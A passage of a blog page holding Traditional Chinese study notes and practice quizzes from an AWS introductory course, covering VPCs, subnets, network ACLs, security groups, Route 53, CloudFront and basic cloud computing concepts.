├─ 類似於在道路上有保全保護，只允許特定的人通行</span><br><span class="line">   ├─ 在 VPC 和內部企業網路之間建立 VPN 連線</span><br><span class="line">   └─ 允許存取 VPC 中的私有資源</span><br><span class="line"></span><br><span class="line">AWS Direct Connect</span><br><span class="line">├─ 建立專用私有連線，連接資料中心和 VPC</span><br><span class="line">├─ 提供專用的私有連線，不受其他用戶影響</span><br><span class="line">└─ 如同在公寓大樓中有專用走廊通往咖啡店，只有住戶能使用的專屬通道</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="/img/AWS34_16.png" alt="連接至包含三個 EC2 執行個體之 VPC 的網際網路閘道圖示。一個箭頭透過網際網路將用戶端連線至閘道，表示用戶端的請求已取得對 VPC 的存取權。"></p>
-<p>連接至包含三個 EC2 執行個體之 VPC 的網際網路閘道圖示。一個箭頭透過網際網路將用戶端連線至閘道，表示用戶端的請求已取得對 VPC 的存取權。</p>
-<p><img src="/img/AWS34_17.png" alt="虛擬私有閘道可讓您在 VPC 和私人網路 (例如內部部署資料中心或企業內部網路) 之間建立虛擬私人網路 (VPN) 連線。流量必須來自核准的網路，虛擬私有閘道才會允許流量進入 VPC。"></p>
-<p>虛擬私有閘道可讓您在 VPC 和私人網路 (例如內部部署資料中心或企業內部網路) 之間建立虛擬私人網路 (VPN) 連線。流量必須來自核准的網路，虛擬私有閘道才會允許流量進入 VPC。</p>
-<p><img src="/img/AWS34_18.png" alt="Untitled"></p>
-<p>企業資料中心會將網路流量路由至 AWS Direct Connect 位置。然後，該流量會透過虛擬私有閘道路由至 VPC。企業資料中心與 VPC 之間的所有網路流量都會透過此專用私有連線流量流程。</p>
-<h2 id="子網路和網路存取權限控制清單-ACL"><a href="#子網路和網路存取權限控制清單-ACL" class="headerlink" title="子網路和網路存取權限控制清單 (ACL)"></a><strong>子網路和網路存取權限控制清單 (ACL)</strong></h2><ul>
-<li>VPC 網路強化<ul>
-<li>安全性工具和技術<ul>
-<li>網路層面安全<ul>
-<li>子網路<ul>
-<li>公有子網路<ul>
-<li>可存取網際網路閘道</li>
-</ul>
-</li>
-<li>私有子網路<ul>
-<li>無法存取網際網路閘道</li>
-</ul>
-</li>
-<li>控制流量權限<ul>
-<li>網路 ACL (無狀態)<ul>
-<li>海關審查人員的比喻</li>
-<li>檢查封包進出子網路<ul>
-<li>核准名單檢查<ul>
-<li>流量可進出 VPC</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>安全群組 (具狀態)<ul>
-<li>每個 EC2 執行個體自動加入</li>
-<li>預設拒絕所有流量</li>
-<li>可修改以允許特定類型的流量</li>
-<li>檢查封包進出 EC2 執行個體<ul>
-<li>核准名單檢查<ul>
-<li>封包通過時不需再次檢查</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>封包的流動過程<ul>
-<li>封包從源執行個體至目標執行個體<ul>
-<li>安全群組檢查<ul>
-<li>允許所有傳出流量</li>
-</ul>
-</li>
-<li>網路 ACL 檢查<ul>
-<li>核准名單檢查<ul>
-<li>封包通過</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>安全群組再次檢查</li>
-</ul>
-</li>
-<li>封包回傳流程<ul>
-<li>安全群組允許傳回流量<ul>
-<li>允許所有傳回流量</li>
-</ul>
-</li>
-<li>網路 ACL 檢查<ul>
-<li>核准名單檢查<ul>
-<li>封包通過</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>安全群組再次檢查</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>整體效果<ul>
-<li>深度安全性<ul>
-<li>結合網路 ACL 和安全群組</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p>比喻:</p>
-<p><img src="/img/AWS34_19.png" alt="Untitled"></p>
-<p><img src="/img/AWS34_20.png" alt="Untitled"></p>
-<ul>
-<li><p>咖啡店範例</p>
-<ul>
-<li>流程描述<ul>
-<li>客人向收銀員點餐<ul>
-<li>收銀員接收訂單並處理</li>
-</ul>
-</li>
-<li>收銀員將訂單交給咖啡師<ul>
-<li>咖啡師製作咖啡</li>
-</ul>
-</li>
-<li>客人順序點餐，排隊人龍順暢移動</li>
-<li>客人試圖跳過收銀員直接向咖啡師點餐<ul>
-<li>中斷動線流動，導致受限制</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>解決方法<ul>
-<li>咖啡店老闆將收銀員和咖啡師配置在不同的工作站<ul>
-<li>區分櫃檯區域，保持流動順暢</li>
-</ul>
-</li>
-<li>收銀員的工作站<ul>
-<li>專為接待客人而設計</li>
-</ul>
-</li>
-<li>咖啡師的工作站<ul>
-<li>不對外開放，僅處理訂單</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>示意圖<ul>
-<li>一名收銀員，一名咖啡師，三名排隊的客戶<ul>
-<li>第一位客戶向收銀員點餐，收銀員接收訂單並轉交給咖啡師</li>
-<li>最後一名客戶試圖直接向咖啡師點餐，但無法這樣做</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>子網路</p>
-<p>  <img src="/img/AWS34_21.png" alt="Untitled"></p>
-<ul>
-<li>定義<ul>
-<li>VPC 的區段，用於將資源分組，可以設為公有或私有</li>
-</ul>
-</li>
-<li>公有子網路<ul>
-<li>包含需要開放存取的資源，如線上商店的網站</li>
-<li><strong>支援客戶使用的網站</strong></li>
-</ul>
-</li>
-<li>私有子網路<ul>
-<li>包含只能透過私有網路存取的資源，如含有客戶個人資訊的資料庫</li>
-<li><strong>分隔含有客戶個人資訊的資料庫</strong></li>
-</ul>
-</li>
-<li>子網路通訊<ul>
-<li>可以彼此通訊，如公有子網路的 EC2 執行個體與私有子網路中的資料庫</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>網路流量</p>
-<ul>
-<li>封包<ul>
-<li>以封包形式傳送的請求資料</li>
-</ul>
-</li>
-<li>流量進出 VPC<ul>
-<li>透過網際網路閘道進入 VPC</li>
-<li>在進出子網路之前檢查權限</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>網路 ACL</p>
-<p>  <img src="/img/AWS34_22.png" alt="Untitled"></p>
-<ul>
-<li><p>定義</p>
-<ul>
-<li>控制子網路層級的傳入和傳出流量的虛擬防火牆</li>
-</ul>
-</li>
-<li><p>功能</p>
-<ul>
-<li><p>無狀態封包篩選</p>
-<ul>
-<li>忽略所有規則，檢查往來跨越子網路邊界的封包</li>
-</ul>
-<p>  <img src="/img/AWS34_23.png" alt="Untitled"></p>
-</li>
-</ul>
-</li>
-<li><p>設定</p>
-<ul>
-<li>預設網路 ACL<ul>
-<li>允許所有傳入和傳出流量，可自行修改</li>
-</ul>
-</li>
-<li>自訂網路 ACL<ul>
-<li>所有流量都被拒絕，除非新增規則允許</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>安全群組</p>
-<p>  <img src="/img/AWS34_24.png" alt="Untitled"></p>
-<ul>
-<li><p>定義</p>
-<ul>
-<li>控制 EC2 執行個體的傳入和傳出流量的虛擬防火牆</li>
-</ul>
-</li>
-<li><p>功能</p>
-<ul>
-<li><p>有狀態封包篩選</p>
-<p>  <img src="/img/AWS34_25.png" alt="Untitled"></p>
-<p>  封包從用戶端透過網際網路傳輸到網際網路閘道，然後進入 VPC。然後，該封包通過網路存取控制清單 (ACL)，並存取兩個 EC2 執行個體所在的公有子網路。</p>
-<ul>
-<li>記住先前針對傳入封包所做的決定</li>
-<li>無論傳入安全群組規則為何，安全群組都會允許回應繼續執行</li>
-</ul>
-<p>  <img src="/img/AWS34_26.png" alt="Untitled"></p>
-</li>
-</ul>
-</li>
-<li><p>設定</p>
-<ul>
-<li>預設情況<ul>
-<li>拒絕所有傳入流量，允許所有傳出流量</li>
-</ul>
-</li>
-<li>自訂規則<ul>
-<li>設定允許或拒絕特定流量</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="知識檢測"><a href="#知識檢測" class="headerlink" title="知識檢測"></a><strong>知識檢測</strong></h3><p>下列哪個敘述與 AWS 帳戶的預設網路存取控制清單 (ACL) 最相符？</p>
-<ul>
-<li><input disabled="" type="checkbox"> 它無狀態，且會拒絕所有傳入和傳出流量。</li>
-<li><input disabled="" type="checkbox"> 它有狀態，且會允許所有傳入和傳出流量。</li>
-<li><input checked="" disabled="" type="checkbox"> 它無狀態，且會允許所有傳入和傳出流量。</li>
-</ul>
-<blockquote>
-<p>網路存取控制清單 (ACL) 會執行<strong>無狀態</strong>封包篩選。這項功能會忽略所有規則，一律檢查往來跨越子網路邊界的傳入和傳出封包。</p>
-<p>每個 AWS 帳戶都包含一個預設網路 ACL。設定 VPC 時，您可以使用帳戶的預設網路 ACL，也可以建立自訂網路 ACL。</p>
-<p>根據預設，帳戶的預設網路 ACL 會允許所有傳入和傳出流量，但您可以自行新增規則來加以修改。如使用自訂網路 ACL，則所有傳入和傳出流量都會遭到拒絕，除非您新增規則，指定應允許哪些流量。此外，所有網路 ACL 都具備一項明確拒絕規則。此規則可確保在封包未符合清單上任何其他規則的情況下，會拒絕該封包。</p>
-</blockquote>
-<ul>
-<li><input disabled="" type="checkbox"> 它有狀態，且會拒絕所有傳入和傳出流量。</li>
-</ul>
-<h2 id="全球網路"><a href="#全球網路" class="headerlink" title="全球網路"></a><strong>全球網路</strong></h2><ul>
-<li>客戶與 AWS 基礎設施互動<ul>
-<li><p>DNS (Domain Name System)</p>
-<p>  <img src="/img/AWS34_27.png" alt="Untitled"></p>
-<p>  用戶端連線至尋找網域的 DNS 解析器。解析器將請求轉送至 DNS 伺服器，該伺服器則將 IP 地址傳回解析器。</p>
-<ul>
-<li>定義<ul>
-<li>將網站名稱翻譯成 IP 地址的服務</li>
-</ul>
-</li>
-<li>路由流程<ul>
-<li>客戶輸入網址至瀏覽器</li>
-<li>瀏覽器聯絡 DNS 解析器</li>
-<li>解析器向 DNS 伺服器查詢 IP 地址</li>
-<li>公司 DNS 伺服器提供 IP 地址</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>Amazon Route 53</p>
-<ul>
-<li>功能<ul>
-<li>提供 DNS 服務</li>
-<li>管理網域名稱的 DNS 記錄</li>
-</ul>
-</li>
-<li>路由政策<ul>
-<li><p>Latency Based Routing</p>
-<ul>
-<li>基於最低延遲路由流量</li>
-</ul>
-</li>
-<li><p>地理位置 DNS</p>
-<ul>
-<li>根據客戶所在地區路由流量</li>
-</ul>
-</li>
-<li><p>地理鄰近度</p>
-<ul>
-<li>將流量路由至最近的節點</li>
-</ul>
-</li>
-<li><p>加權輪詢算法</p>
-<ul>
-<li>根據權重分配流量到不同的端點</li>
-</ul>
-</li>
-<li><p><strong>Amazon Route 53 和 Amazon CloudFront 交付內容</strong></p>
-<p>  <img src="/img/AWS34_28.png" alt="Untitled"></p>
-<ul>
-<li>AnyCompany 的應用程式在數個 Amazon EC2 執行個體上執行</li>
-<li>執行個體所在的 Auto Scaling 群組連接到 Application Load Balancer<ul>
-<li>客戶前往 AnyCompany 的網站以便請求應用程式的資料</li>
-<li>Amazon Route 53 使用 DNS 解析來識別 AnyCompany.com 的相應 IP 地址 192.0.2.0。這個資訊會再傳回給客戶</li>
-<li>客戶的請求會透過 Amazon CloudFront 傳送到最近的節點</li>
-<li>Amazon CloudFront 會連接到 Application Load Balancer，後者會將傳入的封包傳送到 Amazon EC2 執行個體</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>CDN (Content Delivery Network)</p>
-<ul>
-<li>定義<ul>
-<li>協助加快將網站資產交付給客戶的網路</li>
-</ul>
-</li>
-<li>Amazon CloudFront<ul>
-<li>功能<ul>
-<li>部署靜態網路資產到全球節點，提高存取速度</li>
-</ul>
-</li>
-<li>運作方式<ul>
-<li>客戶存取網站</li>
-<li>請求透過 CloudFront 網路</li>
-<li>CloudFront 將請求路由到最近的節點</li>
-<li>節點從遠端伺服器擷取資料</li>
-<li>資料傳送至客戶，減少延遲</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>使用案例<ul>
-<li>北美洲使用者存取網站<ul>
-<li>資產部署到北美洲節點</li>
-</ul>
-</li>
-<li>愛爾蘭使用者存取網站<ul>
-<li>資產部署到愛爾蘭節點</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="知識檢測-1"><a href="#知識檢測-1" class="headerlink" title="知識檢測"></a><strong>知識檢測</strong></h3><p>以下哪個敘述與 DNS 解析最相符？</p>
-<ul>
-<li><input disabled="" type="checkbox"> 在自己定義的虛擬網路中啟動資源</li>
-<li><input disabled="" type="checkbox"> 在世界各地的節點儲存本機的內容副本</li>
-<li><input disabled="" type="checkbox"> 將 VPC 連接到網際網路</li>
-<li><input checked="" disabled="" type="checkbox"> 將網域名稱轉譯為 IP 位址</li>
-</ul>
-<blockquote>
-<p>舉例來說，如果您想前往 AnyCompany 的網站，於是在 PC 輸入網域名稱，這個請求就會傳送到 DNS 伺服器。接下來，DNS 伺服器會向 Web 伺服器要求與 AnyCompany 的網站對應的 IP 位址。Web 伺服器的回應方式是提供某公司網站的 IP 位址 192.0.2.0。</p>
-</blockquote>
-<h2 id="單元-4-總結"><a href="#單元-4-總結" class="headerlink" title="單元 4 總結"></a><strong>單元 4 總結</strong></h2><ul>
-<li><p>AWS 網路連結</p>
-<ul>
-<li>概述<ul>
-<li>將網路連結簡化並抽象化，只需回答「有誰能與彼此互相溝通」這個問題</li>
-</ul>
-</li>
-<li>VPC (Virtual Private Cloud)<ul>
-<li>隔離工作負載的方式</li>
-</ul>
-</li>
-<li>網路安全<ul>
-<li>閘道</li>
-<li>網路 ACL</li>
-<li>安全群組</li>
-<li>阻止顛覆性攻擊的方式</li>
-</ul>
-</li>
-<li>VPN 和 Direct Connect<ul>
-<li>連線到 AWS 的方式</li>
-</ul>
-</li>
-<li>加密<ul>
-<li>在一般網際網路上進行加密</li>
-<li>建立專屬光纖網路安全管道</li>
-</ul>
-</li>
-<li>AWS 全球網路<ul>
-<li>使用節點提供的全球網路</li>
-</ul>
-</li>
-<li>Route 53<ul>
-<li>用於 DNS 的服務</li>
-</ul>
-</li>
-<li>CloudFront<ul>
-<li>就近快取內容給消費者的服務</li>
-</ul>
-</li>
-</ul>
-<h3 id="單元-4-測驗"><a href="#單元-4-測驗" class="headerlink" title="單元 4 測驗"></a><strong>單元 4 測驗</strong></h3><p>  您的公司有一款應用程式使用 Amazon EC2 執行個體來執行客戶使用的網站，並使用 Amazon RDS 資料庫執行個體來存放客戶的個人資訊。根據最佳實務，開發人員應該如何設定 VPC？</p>
-<ul>
-<li><input disabled="" type="checkbox"> 將 Amazon EC2 執行個體放在私有子網路中，將 Amazon RDS 資料庫執行個體放在公有子網路中。</li>
-<li><input checked="" disabled="" type="checkbox"> 將 Amazon EC2 執行個體放在公有子網路中，將 Amazon RDS 資料庫執行個體放在私有子網路中。</li>
-</ul>
-<blockquote>
-<p>正確答案是<strong>將 Amazon EC2 執行個體放在公有子網路中，將 Amazon RDS 資料庫執行個體放在私有子網路中</strong>。</p>
-<p><strong>子網路</strong>是 VPC 的一個區段，您可以根據安全或操作需求將資源分組到區段中。子網路可以設為公有或私有。</p>
-<p>公有子網路包含需要開放存取的資源，例如線上商店的網站。</p>
-<p>私有子網路包含只能透過私有網路存取的資源，例如含有客戶個人資訊和訂單紀錄的資料庫。</p>
-</blockquote>
-<ul>
-<li><input disabled="" type="checkbox"> 將 Amazon EC2 執行個體和 Amazon RDS 資料庫執行個體都放在公有子網路中。</li>
-<li><input disabled="" type="checkbox"> 將 Amazon EC2 執行個體和 Amazon RDS 資料庫執行個體都放在私有子網路中。</li>
-</ul>
-<p>  以下哪個元件可用於建立公司的資料中心和 AWS 之間的私有專用連線？</p>
-<ul>
-<li><input disabled="" type="checkbox"> 私有子網路</li>
-<li><input disabled="" type="checkbox"> DNS</li>
-<li><input checked="" disabled="" type="checkbox"> AWS Direct Connect</li>
-</ul>
-<blockquote>
-<p>其他答案皆不正確，因為：</p>
-<ul>
-<li>私有子網路是 VPC 的一個區段，您可以將只能透過私有網路存取的資源分組到這些區段中。儘管私有，但它不會用於建立資料中心和 AWS 之間的連線。</li>
-<li>DNS 全稱為網域名稱系統，它是用於與 IP 地址的網域名稱比對的目錄。</li>
-<li>虛擬私有閘道可讓您在 VPC 和私有網路 (例如公司的資料中心) 之間建立 VPN 連線。雖然此連線為私有且經過加密，但是會流經公有網際網路，而不是經由專用連線。</li>
-</ul>
-</blockquote>
-<ul>
-<li><input disabled="" type="checkbox"> 虛擬私有閘道</li>
-</ul>
-<p>  以下哪個敘述與安全群組最相符？</p>
-<ul>
-<li><input checked="" disabled="" type="checkbox"> 根據預設，它們具有狀態，且會拒絕所有傳入流量。</li>
-</ul>
-<blockquote>
-<p>安全群組是具狀態的。也就是說，它們在評估執行個體的新請求時，會運用先前的流量模式和流動情形。</p>
-<p>根據預設，安全群組會拒絕所有傳入流量，但您可以新增自訂規則，以便符合自己的操作和安全需求。</p>
-</blockquote>
-<ul>
-<li><input disabled="" type="checkbox"> 根據預設，它們具有狀態，且會允許所有傳入流量。</li>
-<li><input disabled="" type="checkbox"> 根據預設，它們沒有狀態，且會拒絕所有傳入流量。</li>
-<li><input disabled="" type="checkbox"> 根據預設，它們沒有狀態，且會允許所有傳入流量。</li>
-</ul>
-<p>  以下哪個元件使用於將 VPC 連接到網際網路？</p>
-<ul>
-<li><input disabled="" type="checkbox"> 公有子網路</li>
-<li><input disabled="" type="checkbox"> 節點</li>
-<li><input disabled="" type="checkbox"> 安全群組</li>
-<li><input checked="" disabled="" type="checkbox"> 網際網路閘道</li>
-</ul>
-<blockquote>
-<p>其他回答選項皆不正確，因為：</p>
-<ul>
-<li>公有子網路是 VPC 的區段，包含公有資源。</li>
-<li>節點是 Amazon CloudFront 用來存放內容快取副本的地點，藉此加速向客戶交付內容。</li>
-<li>安全群組是一種虛擬防火牆，可控制 Amazon EC2 執行個體的傳入和傳出流量。</li>
-</ul>
-</blockquote>
-<p>  以下哪種服務可用於管理網域名稱的 DNS 記錄？</p>
-<ul>
-<li><input disabled="" type="checkbox"> Amazon Virtual Private Cloud</li>
-<li><input disabled="" type="checkbox"> AWS Direct Connect</li>
-<li><input disabled="" type="checkbox"> Amazon CloudFront</li>
-<li><input checked="" disabled="" type="checkbox"> Amazon Route 53</li>
-</ul>
-<blockquote>
-<p>Amazon Route 53 是一種 DNS Web 服務。它提供可靠的方式，讓開發人員和企業將終端使用者路由到託管於 AWS 的網際網路應用程式。</p>
-<p>Route 53 還具備能力管理網域名稱的 DNS 紀錄。您可以轉移其他網域註冊機構管理的現有網域名稱下存在的 DNS 記錄。您也可以直接在 Route 53 中註冊新的網域名稱。</p>
-<p>其他選項皆不正確，因為：</p>
-<ul>
-<li>Amazon Virtual Private Cloud (Amazon VPC) 這項服務可讓您佈建 AWS Cloud 的分隔區段。在這個分隔區段中，您可以在自己定義的虛擬網路中啟動資源。</li>
-<li>AWS Direct Connect 這項服務可讓您在資料中心和 VPC 之間建立專用私有連線。</li>
-<li>Amazon CloudFront 是一種內容交付服務。這種服務使用節點網路來快取內容，並將內容交付給世界各地的客戶。</li>
-</ul>
-</blockquote>
-</li>
-</ul>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-  
-    <article id="post-AWS12" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2024/12/21/AWS12/" class="article-date">
-  	<time datetime="2024-12-21T12:32:07.073Z" itemprop="datePublished">2024-12-21</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/12/21/AWS12/">
-        AWS Basic Architecture 1
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="單元一簡介"><a href="#單元一簡介" class="headerlink" title="單元一簡介"></a>單元一簡介</h1><ol>
-<li><p><strong>AWS 提供廣泛的服務</strong>：AWS 提供各種服務，從基本的運算、儲存和網路安全工具，到複雜的解決方案，如區塊鏈、機器學習、人工智慧和機器人開發平台。</p>
-</li>
-<li><p><strong>用戶端-伺服器模型</strong>：現代運算通常使用<strong>用戶端-伺服器</strong>模型。</p>
-<p> <img src="/img/AWS12.png" alt="Untitled"></p>
-<ul>
-<li>用戶端可以是 Web 瀏覽器或桌面應用程式，向伺服器提出請求</li>
-<li>伺服器可以是虛擬伺服器，如 Amazon EC2。</li>
-</ul>
- <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用戶端                          伺服器</span><br><span class="line">(客人)                         (咖啡師)</span><br><span class="line"></span><br><span class="line">    |                            | </span><br><span class="line">    |提出點咖啡的請求 -----------&gt;  |</span><br><span class="line">    |&lt;------ 檢查請求是否合法----   |</span><br><span class="line">    |                           |</span><br><span class="line">    |准備支付                     |</span><br><span class="line">    |------------&gt;確認支付是否成功  |</span><br><span class="line">    |&lt;------準備咖啡------------- |</span><br><span class="line">    |                           |</span><br><span class="line">    |收到咖啡 &lt;-----------咖啡完成  |</span><br><span class="line"></span><br><span class="line">------------------------------------------</span><br><span class="line">在此流程圖中：</span><br><span class="line"></span><br><span class="line">- 用戶端代表了咖啡店的客人，他們提出點咖啡的請求。</span><br><span class="line">- 伺服器代表了咖啡店的咖啡師，他們負責準備咖啡。</span><br><span class="line">- 箭頭表示信息的流動方向，從用戶端到伺服器，以及從伺服器到用戶端。</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>按需支付</strong>：AWS 的支付模式是按需支付，不需要預先支付任何費用，也不必擔心容量限制。只有在需要時才支付費用，並且可以隨時釋放不再需要的資源。</p>
-</li>
-<li><p><strong>雲端運算基礎概念</strong>：AWS 的基礎概念包括按需計費、彈性伸縮、安全性、高可用性等。這些概念有助於業務有效地運行在雲端平台上。</p>
-</li>
-<li><p><strong>教育和支援</strong>：AWS 提供廣泛的教育和支援，讓用戶能夠瞭解和利用 AWS 的各種功能和服務，包括培訓課程、文件和社群支援。</p>
-</li>
-</ol>
-<h2 id="雲端運算"><a href="#雲端運算" class="headerlink" title="雲端運算"></a>雲端運算</h2><ul>
-<li>雲端運算的核心概念<ul>
-<li>雲端運算是透過網際網路提供的 IT 資源隨需交付<ul>
-<li>隨需交付<ul>
-<li>AWS 可在有需求時立即提供所需資源</li>
-<li>無需事先告知何時需要資源</li>
-<li>靈活地啟用和停用資源，隨即停止付費</li>
-<li>非常靈活，無法透過自行管理資料中心實現的靈活性</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>IT 資源的概念<ul>
-<li>重要性<ul>
-<li>AWS 的目標是協助用戶專注於突顯業務獨特性</li>
-</ul>
-</li>
-<li>無差異的繁重工作<ul>
-<li>AWS 針對重複性高、耗時的任務提供協助</li>
-<li>用戶可以透過安全的網頁主控台或程式設計方式存取資源</li>
-</ul>
-</li>
-<li>實支實付的定價<ul>
-<li>用戶只需支付所使用的資源費用</li>
-<li>無需預付費用或額外合約</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>雲端運算的部署模型<ul>
-<li>雲端<ul>
-<li>在雲端中執行完整的應用程式</li>
-<li>遷移現有應用程式或建立新應用程式</li>
-</ul>
-</li>
-<li>內部部署<ul>
-<li>使用虛擬化和資源管理工具部署資源</li>
-<li>提高資源使用率</li>
-</ul>
-</li>
-<li>混合<ul>
-<li>將雲端資源連接到內部部署基礎設施</li>
-<li>整合雲端資源與傳統 IT 應用程式</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>雲端運算的優勢<ul>
-<li>將預付成本轉成變動成本<ul>
-<li>省去投資於資料中心和伺服器的預先投資</li>
-</ul>
-</li>
-<li>停止將資金花費在執行和維護資料中心上<ul>
-<li>減少在基礎設施管理上的時間和金錢</li>
-</ul>
-</li>
-<li>無需猜測容量<ul>
-<li>不必預先評估需要多少基礎設施容量</li>
-<li>可根據需求動態調整資源</li>
-</ul>
-</li>
-<li>受益於大範圍規模經濟<ul>
-<li>可以享有更低的成本</li>
-</ul>
-</li>
-<li>提升速度和敏捷性<ul>
-<li>可以更快速地開發和部署應用程式</li>
-</ul>
-</li>
-<li>快速進入全球市場<ul>
-<li>可以迅速向全球部署應用程式並降低延遲</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="單元一測驗"><a href="#單元一測驗" class="headerlink" title="單元一測驗"></a>單元一測驗</h3><p>回答本測驗中的問題，測試您對本單元中某些主要概念的理解程度。</p>
-<ol>
-<li>什麼是雲端運算？</li>
-</ol>
-<ul>
-<li><p><input disabled="" type="checkbox"> 
-將儲存在桌上型電腦和行動裝置中的檔案加以備份，以防資料遺失</p>
-</li>
-<li><p><input disabled="" type="checkbox"> 
-部署連線至內部部署基礎設施的應用程式</p>
-</li>
-<li><p><input disabled="" type="checkbox"> 
-無需管理或佈建伺服器即可執行程式碼</p>
-</li>
-<li><p><input checked="" disabled="" type="checkbox"> 
-透過網路以實支實付定價方式收費的 IT 資源和應用程式隨需交付</p>
-<p>  其他回答選項皆不正確，因為：</p>
-<blockquote>
-<p>檔案雖然可以備份到雲端，但第一個選項並未完整解釋雲端運算。</p>
-<p>部署連接到內部部署基礎設施的應用程式是混合雲端部署的使用案例。別忘了，雲端運算還有雲端和內部部署 (或私有雲端) 的部署模型。</p>
-<p>AWS Lambda 是一項 AWS 服務，可讓您在不需要管理或佈建伺服器的情況下執行程式碼。這項描述並未完整說明雲端運算</p>
-</blockquote>
-</li>
-</ul>
-<ol>
-<li>內部部署的別稱是什麼？</li>
-</ol>
-<ul>
-<li><p><input checked="" disabled="" type="checkbox"> 
-私有雲端部署</p>
-<p>  其他回答選項皆不正確，因為：</p>
-<blockquote>
-<p>雲端應用程式會完全部署在雲端中，不會有以內部部署方式執行的任何部分。</p>
-<p>混合部署會連接起雲端資源與雲端外現有資源 (例如內部部署資源) 之間的基礎設施和應用程式。不過，混合部署並不等同於內部部署，因為它需使用到位於雲端的資源。</p>
-<p>AWS 雲端提供三種雲端部署模型：雲端、混合和內部部署。 AWS 雲端不等同於內部部署本身。</p>
-</blockquote>
-</li>
-<li><p><input disabled="" type="checkbox"> 
-雲端應用程式</p>
-</li>
-<li><p><input disabled="" type="checkbox"> 
-混合部署</p>
-</li>
-<li><p><input disabled="" type="checkbox"> 
-AWS 雲端</p>
-</li>
-</ul>
-<ol>
-<li>雲端運算的規模為何有助於節省成本？</li>
-</ol>
-<ul>
-<li><p><input disabled="" type="checkbox"> 
-您不必在使用技術資源之前預先進行投資。</p>
-</li>
-<li><p><input checked="" disabled="" type="checkbox"> 
-大量客戶的雲端用量經過彙總後，會產生較低廉的實支實付價格。</p>
-<p>  其他回答選項皆不正確，因為：</p>
-<blockquote>
-<p>您不必在使用技術資源之前預先進行投資，請參考<em>將預付成本轉成變動成本</em>。</p>
-<p>隨需存取服務可避免容量過多或受限，請參考<em>無需猜測容量</em>。</p>
-<p>可快速向客戶部署應用程式部署，並降低延遲，請參考<em>快速進入全球市場</em>。</p>
-</blockquote>
-</li>
-<li><p><input disabled="" type="checkbox"> 
-隨需存取服務有助於防止容量過剩或受限。</p>
-</li>
-<li><p><input disabled="" type="checkbox"> 
-您可以快速向客戶部署應用程式，並且降低延遲。</p>
-</li>
-</ul>
-<h1 id="單元二簡介"><a href="#單元二簡介" class="headerlink" title="單元二簡介"></a>單元二簡介</h1><p><img src="/img/AWS12_1.png" alt="Untitled"></p>
-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> AWS (Amazon Web Services)</span><br><span class="line">  |</span><br><span class="line">  |- Amazon Elastic Compute Cloud (Amazon EC2)</span><br><span class="line">  |   |</span><br><span class="line">  |   |- 靈活、符合成本效益、快速的運算</span><br><span class="line">  |   |- 虛擬化技術管理的實體主機電腦上執行</span><br><span class="line">  |   |   |- 會與多個其他執行個體(虛擬機器)一起共用主機</span><br><span class="line">  |   |   |-  Hypervisor </span><br><span class="line">  |   |   |   |- 虛擬機器之間分享基礎實體資源</span><br><span class="line">  |   |   |   |- 共用基礎硬體的概念稱為多租用戶(由AWS管理)</span><br><span class="line">  |   |- 代替內部部署資源</span><br><span class="line">  |   |- 啟動 EC2 執行個體的流程</span><br><span class="line">  |   |   |</span><br><span class="line">  |   |   |- 1. 啟動</span><br><span class="line">  |   |   |   |- 選擇基本組態範本、執行個體類型</span><br><span class="line">  |   |   |   |   |- 包括作業系統、應用程式伺服器或應用程式</span><br><span class="line">  |   |   |   |- 指定安全設定</span><br><span class="line">  |   |   |   |   |- 控制可往來流經執行個體的網路流量</span><br><span class="line">  |   |   |- 2. 連接</span><br><span class="line">  |   |   |   |- 多種方式連接到執行個體</span><br><span class="line">  |   |   |   |   |- 程式和應用程式有多種不同方法來直接連接到執行個體並交換資料</span><br><span class="line">  |   |   |   |   |- 使用者登入並存取電腦桌面來連接執行個體</span><br><span class="line">  |   |   |- 3. 使用</span><br><span class="line">  |   |       |- 在執行個體中執行命令、安裝軟體等</span><br><span class="line">  |   |</span><br><span class="line">  |   |- 執行個體的靈活性和控制性</span><br><span class="line">  |   |   |</span><br><span class="line">  |   |   |- 選擇作業系統和執行軟體</span><br><span class="line">  |   |   |- <span class="strong">**垂直擴展**</span>執行個體(擴大或縮小)</span><br><span class="line">  |   |   |- 控制網路連結層面</span><br><span class="line">  |   |   |   |   |- 